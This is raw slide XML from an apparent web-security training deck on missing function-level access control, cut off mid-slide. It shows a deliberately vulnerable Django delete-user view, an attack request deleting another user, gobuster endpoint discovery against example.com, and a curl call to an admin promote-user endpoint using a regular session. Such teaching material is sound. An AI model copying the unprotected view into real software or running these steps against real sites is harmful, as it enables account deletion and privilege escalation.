              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6145649" y="6431399"/>
            <a:ext cx="7825502" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Regular user becomes administrator!</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025021" y="1225034"/>
            <a:ext cx="6274832" cy="408027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5.4 Missing Function Level Access Control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3025021" y="1660327"/>
            <a:ext cx="3562945" cy="203954"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What is Missing Function Level Access Control?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3025021" y="1966436"/>
            <a:ext cx="8580239" cy="153948"/>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Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Administrative or privileged functions are accessible to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unauthorized users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> because the application doesn't verify permissions.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3025021" y="2222540"/>
            <a:ext cx="1961555" cy="203954"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3025021" y="2528649"/>
            <a:ext cx="8580239" cy="2187773"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2387"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3018830" y="2528649"/>
            <a:ext cx="8592622" cy="2187773"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 853"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3143131" y="2621875"/>
            <a:ext cx="8344019" cy="2001322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 Django - VULNERABLE CODE</a:t>
            </a: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from django.http import JsonResponse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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def delete_user(request):</a:t>
            </a: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    user_id = request.POST.get('user_id')</a:t>
            </a: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    # NO PERMISSION CHECK!</a:t>
            </a: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    User.objects.filter(id=user_id).delete()</a:t>
            </a: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    return JsonResponse({'status': 'deleted'})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 URL routing</a:t>
            </a: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urlpatterns = [</a:t>
            </a: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    path('api/admin/delete-user', delete_user),  # No @admin_required decorator!</a:t>
            </a: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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3025021" y="4818578"/>
            <a:ext cx="1632109" cy="203954"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3025021" y="5124688"/>
            <a:ext cx="8580239" cy="1879878"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2778"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3018830" y="5124688"/>
            <a:ext cx="8592622" cy="1879878"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 992"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3143131" y="5217914"/>
            <a:ext cx="8344019" cy="1693426"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 Regular user discovers admin endpoint</a:t>
            </a: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POST /api/admin/delete-user</a:t>
            </a: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Content-Type: application/json</a:t>
            </a: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Cookie: regular_user_session</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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a:t>
            </a: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 "user_id": 456</a:t>
            </a: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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response: {"status": "deleted"}</a:t>
            </a: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 User 456 is deleted by non-admin user!</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604135" y="1085017"/>
            <a:ext cx="6685598" cy="448032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Real Example - Hidden Admin Functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604135" y="1565910"/>
            <a:ext cx="1792129" cy="223957"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Discovery Phase:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604135" y="1913096"/>
            <a:ext cx="9422011" cy="1779984"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3222"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2597348" y="1913096"/>
            <a:ext cx="9435584" cy="1779984"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1151"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2733794" y="2015490"/>
            <a:ext cx="9162693" cy="1575197"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Attacker uses directory brute-forcing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>gobuster dir -u https://example.com -w wordlist.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Discovers hidden admin endpoints:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/admin/users</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/admin/delete</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/admin/settings</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/api/admin/promote-user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/api/admin/view-logs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604135" y="3816310"/>
            <a:ext cx="1792129" cy="223957"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604135" y="4163497"/>
            <a:ext cx="9422011" cy="1079897"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5311"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2597348" y="4163497"/>
            <a:ext cx="9435584" cy="1079897"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1897"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2733794" y="4265890"/>
            <a:ext cx="9162693" cy="875109"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Test admin endpoint without admin privileges</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>curl -X POST https://example.com/api/admin/promote-user \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  -H "Cookie: session=regular_user_token" \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
